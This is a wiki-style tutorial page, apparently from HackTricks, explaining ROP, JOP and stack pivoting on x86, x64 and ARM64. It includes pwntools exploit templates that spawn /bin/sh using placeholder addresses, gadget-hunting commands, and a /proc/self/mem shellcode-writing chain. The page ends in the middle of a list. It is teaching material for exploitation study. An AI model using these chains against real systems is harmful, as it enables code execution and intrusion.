_body: "# ROP & JOP\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## **Basic Information**\n\n**Return-Oriented\
  \ Programming (ROP)** is an advanced exploitation technique used to circumvent security measures like **No-Execute (NX)**\
  \ or **Data Execution Prevention (DEP)**. Instead of injecting and executing shellcode, an attacker leverages pieces of\
  \ code already present in the binary or in loaded libraries, known as **\"gadgets\"**. Each gadget typically ends with a\
  \ `ret` instruction and performs a small operation, such as moving data between registers or performing arithmetic operations.\
  \ By chaining these gadgets together, an attacker can construct a payload to perform arbitrary operations, effectively bypassing\
  \ NX/DEP protections.\n\n### How ROP Works\n\n1. **Control Flow Hijacking**: First, an attacker needs to hijack the control\
  \ flow of a program, typically by exploiting a buffer overflow to overwrite a saved return address on the stack.\n2. **Gadget\
  \ Chaining**: The attacker then carefully selects and chains gadgets to perform the desired actions. This could involve\
  \ setting up arguments for a function call, calling the function (e.g., `system(\"/bin/sh\")`), and handling any necessary\
  \ cleanup or additional operations.\n3. **Payload Execution**: When the vulnerable function returns, instead of returning\
  \ to a legitimate location, it starts executing the chain of gadgets.\n\n### Tools\n\nTypically, gadgets can be found using\
  \ [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) or directly\
  \ from **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).\n\n## ROP Chain in x86 Example\n\n### **x86\
  \ (32-bit) Calling conventions**\n\n- **cdecl**: The caller cleans the stack. Function arguments are pushed onto the stack\
  \ in reverse order (right-to-left). **Arguments are pushed onto the stack from right to left.**\n- **stdcall**: Similar\
  \ to cdecl, but the callee is responsible for cleaning the stack.\n\n### **Finding Gadgets**\n\nFirst, let's assume we've\
  \ identified the necessary gadgets within the binary or its loaded libraries. The gadgets we're interested in are:\n\n-\
  \ `pop eax; ret`: This gadget pops the top value of the stack into the `EAX` register and then returns, allowing us to control\
  \ `EAX`.\n- `pop ebx; ret`: Similar to the above, but for the `EBX` register, enabling control over `EBX`.\n- `mov [ebx],\
  \ eax; ret`: Moves the value in `EAX` to the memory location pointed to by `EBX` and then returns. This is often called\
  \ a **write-what-where gadget**.\n- Additionally, we have the address of the `system()` function available.\n\n### **ROP\
  \ Chain**\n\nUsing **pwntools**, we prepare the stack for the ROP chain execution as follows aiming to execute `system('/bin/sh')`,\
  \ note how the chain starts with:\n\n1. A `ret` instruction for alignment purposes (optional)\n2. Address of `system` function\
  \ (supposing ASLR disabled and known libc, more info in [**Ret2lib**](ret2lib/index.html))\n3. Placeholder for the return\
  \ address from `system()`\n4. `\"/bin/sh\"` string address (parameter for system function)\n\n```python\nfrom pwn import\
  \ *\n\n# Assuming we have the binary's ELF and its process\nbinary = context.binary = ELF('your_binary_here')\np = process(binary.path)\n\
  \n# Find the address of the string \"/bin/sh\" in the binary\nbin_sh_addr = next(binary.search(b'/bin/sh\\x00'))\n\n# Address\
  \ of system() function (hypothetical value)\nsystem_addr = 0xdeadc0de\n\n# A gadget to control the return address, typically\
  \ found through analysis\nret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address\n\
  \n# Construct the ROP chain\nrop_chain = [\n    ret_gadget,    # This gadget is used to align the stack if necessary, especially\
  \ to bypass stack alignment issues\n    system_addr,   # Address of system(). Execution will continue here after the ret\
  \ gadget\n    0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another\
  \ safe place.\n    bin_sh_addr    # Address of \"/bin/sh\" string goes here, as the argument to system()\n]\n\n# Flatten\
  \ the rop_chain for use\nrop_chain = b''.join(p32(addr) for addr in rop_chain)\n\n# Send ROP chain\n## offset is the number\
  \ of bytes required to reach the return address on the stack\npayload = fit({offset: rop_chain})\np.sendline(payload)\n\
  p.interactive()\n```\n\n## ROP Chain in x64 Example\n\n### **x64 (64-bit) Calling conventions**\n\n- Uses the **System V\
  \ AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in\
  \ the registers `RDI`, `RSI`, `RDX`, `RCX`, `R8`, and `R9`**. Additional arguments are passed on the stack. The return value\
  \ is placed in `RAX`.\n- **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer\
  \ or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.\n- **Registers**:\
  \ 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.\n\n#### **Finding\
  \ Gadgets**\n\nFor our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **\"\
  /bin/sh\"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified\
  \ the following gadgets:\n\n- **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential\
  \ for setting our argument for **system()**.\n- **ret**: A simple return, useful for stack alignment in some scenarios.\n\
  \nAnd we know the address of the **system()** function.\n\n### **ROP Chain**\n\nBelow is an example using **pwntools** to\
  \ set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:\n\n```python\nfrom pwn import *\n\n\
  # Assuming we have the binary's ELF and its process\nbinary = context.binary = ELF('your_binary_here')\np = process(binary.path)\n\
  \n# Find the address of the string \"/bin/sh\" in the binary\nbin_sh_addr = next(binary.search(b'/bin/sh\\x00'))\n\n# Address\
  \ of system() function (hypothetical value)\nsystem_addr = 0xdeadbeefdeadbeef\n\n# Gadgets (hypothetical values)\npop_rdi_gadget\
  \ = 0xcafebabecafebabe  # pop rdi; ret\nret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary\n\n\
  # Construct the ROP chain\nrop_chain = [\n    ret_gadget,        # Alignment gadget, if needed\n    pop_rdi_gadget,    #\
  \ pop rdi; ret\n    bin_sh_addr,       # Address of \"/bin/sh\" string goes here, as the argument to system()\n    system_addr\
  \        # Address of system(). Execution will continue here.\n]\n\n# Flatten the rop_chain for use\nrop_chain = b''.join(p64(addr)\
  \ for addr in rop_chain)\n\n# Send ROP chain\n## offset is the number of bytes required to reach the return address on the\
  \ stack\npayload = fit({offset: rop_chain})\np.sendline(payload)\np.interactive()\n```\n\nIn this example:\n\n- We utilize\
  \ the **`pop rdi; ret`** gadget to set **`RDI`** to the address of **`\"/bin/sh\"`**.\n- We directly jump to **`system()`**\
  \ after setting **`RDI`**, with **system()**'s address in the chain.\n- **`ret_gadget`** is used for alignment if the target\
  \ environment requires it, which is more common in **x64** to ensure proper stack alignment before calling functions.\n\n\
  ### Stack Alignment\n\n**The x86-64 ABI** ensures that the **stack is 16-byte aligned** when a **call instruction** is executed.\
  \ **LIBC**, to optimize performance, **uses SSE instructions** (like **movaps**) which require this alignment. If the stack\
  \ isn't aligned properly (meaning **RSP** isn't a multiple of 16), calls to functions like **system** will fail in a **ROP\
  \ chain**. To fix this, simply add a **ret gadget** before calling **system** in your ROP chain.\n\n## x86 vs x64 main difference\n\
  \n> [!TIP]\n> Since **x64 uses registers for the first few arguments,** it often requires fewer gadgets than x86 for simple\
  \ function calls, but finding and chaining the right gadgets can be more complex due to the increased number of registers\
  \ and the larger address space. The increased number of registers and the larger address space in **x64** architecture provide\
  \ both opportunities and challenges for exploit development, especially in the context of Return-Oriented Programming (ROP).\n\
  \n## ROP chain in ARM64\n\nRegarding **ARM64 Basics & Calling conventions**, check the following page for this information:\n\
  \n{{#ref}}\n../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md\n\
  {{#endref}}\n\n> [!DANGER]\n> It's important to notice taht when jumping to a function using a ROP in **ARM64** you should\
  \ jump to the 2nd instruction of the funciton (at least) to prevent storing in the stack the current stack pointer and end\
  \ up in an eternal loop calling the funciton once and again.\n\n### Finding gadgets in system Dylds\n\nThe system libraries\
  \ comes compiled in one single file called **dyld_shared_cache_arm64**. This file contains all the system libraries in a\
  \ compressed format. To download this file from the mobile device you can do:\n\n```bash\nscp [-J <domain>] root@10.11.1.1:/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64\
  \ .\n# -Use -J if connecting through Corellium via Quick Connect\n```\n\nThen, you cna use a couple of tools to extract\
  \ the actual libraries from the dyld_shared_cache_arm64 file:\n\n- [https://github.com/keith/dyld-shared-cache-extractor](https://github.com/keith/dyld-shared-cache-extractor)\n\
  - [https://github.com/arandomdev/DyldExtractor](https://github.com/arandomdev/DyldExtractor)\n\n```bash\nbrew install keith/formulae/dyld-shared-cache-extractor\n\
  dyld-shared-cache-extractor dyld_shared_cache_arm64 dyld_extracted\n```\n\nNow, in order to find interesting gadgets for\
  \ the binary you are exploiting, you first need to know which libraries are loaded by the binary. You can use *lldb** for\
  \ this:\n\n```bash\nlldb ./vuln\nbr s -n main\nrun\nimage list\n```\n\nFinally, you can use [**Ropper**](https://github.com/sashs/ropper)\
  \ to find gadgets in the libraries you are interested in:\n\n```bash\n# Install\npython3 -m pip install ropper --break-system-packages\n\
  ropper --file libcache.dylib --search \"mov x0\"\n```\n\n## JOP - Jump Oriented Programming\n\nJOP is a similar technique\
  \ to ROP, but each gadget, instead of using a RET instruction ad the end of the gadget, **it uses jump addresses**. This\
  \ can be particularly useful in situations where ROP is not feasible, such as when there are no suitable gadgets available.\
  \ This is commonly used in **ARM** architectures where the `ret` instruction is not as commonly used as in x86/x64 architectures.\n\
  \nYou can use **`rop`** tools to find JOP gadgets also, for example:\n\n```bash\ncd usr/lib/system # (macOS or iOS) Let's\
  \ check in these libs inside the dyld_shared_cache_arm64\nropper --file *.dylib --search \"ldr x0, [x0\" # Supposing x0\
  \ is pointing to the stack or heap and we control some space around there, we could search for Jop gadgets that load from\
  \ x0\n```\n\nLet's see an example:\n\n- There is a **heap overflow that allows us to overwrite a function pointer** stored\
  \ in the heap that will be called.\n  - **`x0`** is pointing to the heap where we control some space\n\n- From the loaded\
  \ system libraries we find the following gadgets:\n\n```\n0x00000001800d1918: ldr x0, [x0, #0x20]; ldr x2, [x0, #0x30];\
  \ br x2; \n0x00000001800e6e58: ldr x0, [x0, #0x20]; ldr x3, [x0, #0x10]; br x3; \n```\n\n- We can use the first gadget to\
  \ load **`x0`** with a pointer to **`/bin/sh`** (stored in the heap) and then load **`x2`** from **`x0 + 0x30`** with the\
  \ address of **`system`** and jump to it.\n\n## Stack Pivot\n\nStack pivoting is a technique used in exploitation to change\
  \ the stack pointer (`RSP` in x64, `SP` in ARM64) to point to a controlled area of memory, such as the heap or a buffer\
  \ on the stack, where the attacker can place their payload (usually a ROP/JOP chain).\n\nExamples of Stack Pivoting chains:\n\
  \n- Example just 1 gadget:\n\n```\nmov sp, x0; ldp x29, x30, [sp], #0x10; ret;\n\nThe `mov sp, x0` instruction sets the\
  \ stack pointer to the value in `x0`, effectively pivoting the stack to a new location. The subsequent `ldp x29, x30, [sp],\
  \ #0x10; ret;` instruction loads the frame pointer and return address from the new stack location and returns to the address\
  \ in `x30`.\n```\n\n```\nI found this gadget in libunwind.dylib\nIf x0 points to a heap you control, you can control the\
  \ stack pointer and move the stack to the heap, and therefore you will control the stack.\n\n0000001c61a9b9c:\n    ldr x16,\
  \ [x0, #0xf8];    // Control x16\n    ldr x30, [x0, #0x100];   // Control x30\n    ldp x0, x1, [x0];        // Control x1\n\
  \    mov sp, x16;             // Control sp    \n    ret;                     // ret will jump to x30, which we control\n\
  \nTo use this gadget you could use in the heap something like:\n  <address of x0 to keep x0>     # ldp x0, x1, [x0]\n  <address\
  \ of gadget>            # Let's suppose this is the overflowed pointer that allows to call the ROP chain\n  \"A\" * 0xe8\
  \ (0xf8-16)           # Fill until x0+0xf8\n  <address x0+16>                # Lets point SP to x0+16 to control the stack\n\
  \  <next gadget>                  # This will go into x30, which will be called with ret (so add of 2nd gadget)\n```\n\n\
  - Example multiple gadgets:\n\n```\n// G1: Typical PAC epilogue that restores frame and returns\n// (seen in many leaf/non-leaf\
  \ functions)\nG1:\n    ldp     x29, x30, [sp], #0x10     // restore FP/LR\n    autiasp                          // **PAC\
  \ check on LR**\n    retab                            // **PAC-aware return**\n\n// G2: Small helper that (dangerously)\
  \ moves SP from FP\n// (appears in some hand-written helpers / stubs; good to grep for)\nG2:\n    mov     sp, x29      \
  \            // **pivot candidate**\n    ret\n\n// G3: Reader on the new stack (common prologue/epilogue shape)\nG3:\n \
  \   ldp     x0, x1, [sp], #0x10      // consume args from \"new\" stack\n    ret\n```\n\n```\nG1:\n    stp x8, x1, [sp]\
  \  // Store at [sp] → value of x8 (attacker controlled) and at [sp+8] → value of x1 (attacker controlled)\n    ldr x8, [x0]\
  \      // Load x8 with the value at address x0 (controlled by attacker, address of G2)\n    blr x8            // Branch\
  \ to the address in x8 (controlled by attacker)  \n\nG2:\n    ldp x29, x30, [sp], #0x10  // Loads x8 -> x29 and x1 -> x30.\
  \ The value in x1 is the value for G3\n    ret\nG3:\n    mov sp, x29       // Pivot the stack to the address in x29, which\
  \ was x8, and was controlled by the attacker possible pointing to the heap\n    ret\n```\n\n## Shellcode via /proc/self/mem\
  \ (Embedded Linux)\n\nIf you already have a ROP chain but **no RWX mappings**, an alternative is to **write shellcode into\
  \ the current process using** `/proc/self/mem` and then jump to it. This is common on embedded Linux targets where `/proc/self/mem`\
  \ can ignore write protections on executable segments in default configurations.\n\nTypical chain idea:\n\n```c\nfd = open(\"\
  /proc/self/mem\", O_RDWR);\nlseek(fd, target_addr, SEEK_SET);   // e.g., a known RX mapping or code cave\nwrite(fd, shellcode,\
  \ shellcode_len);\n((void(*)())target_addr)();         // ARM Thumb: jump to target_addr | 1\n```\n\nIf preserving `fd`\
  \ is hard, calling `open()` multiple times can make it feasible to **guess the descriptor** used for `/proc/self/mem`. On\
  \ ARM Thumb targets, remember to **set the low bit** when branching (`addr | 1`).\n\n\n## Protections Against ROP and JOP\n\
  \n- [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/index.html):\
  \ These protections makes harder the use of ROP as the addresses of the gadgets changes between execution.\n- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/index.html):\
  \ In of a BOF, it's needed to bypass the stores stack canary to overwrite return pointers to abuse a ROP chain\n- **Lack\
  \ of Gadgets**: If there aren't enough gadgets it won't be possible to generate a ROP chain.\n\n## ROP based techniques\n\
  \nNotice that ROP is just a technique in order to execute arbitrary code. Based in ROP a lot of Ret2XXX techniques were\
  \ developed:\n\n- **Ret2lib**: Use ROP to call arbitrary functions from a loaded library with arbitrary parameters (usually\
  \ something like `system('/bin/sh')`.\n\n\n{{#ref}}\nret2lib/\n{{#endref}}\n\n- **Ret2Syscall**: Use ROP to prepare a call\
  \ to a syscall, e.g. `execve`, and make it execute arbitrary commands.\n\n\n{{#ref}}\nrop-syscall-execv/\n{{#endref}}\n\n\
  - **EBP2Ret & EBP Chaining**: The first will abuse EBP instead of EIP to control the flow and the second is similar to Ret2lib\
  \ but in this case the flow is controlled mainly with EBP addresses (although t's also needed to control EIP).\n\n\n{{#ref}}\n\
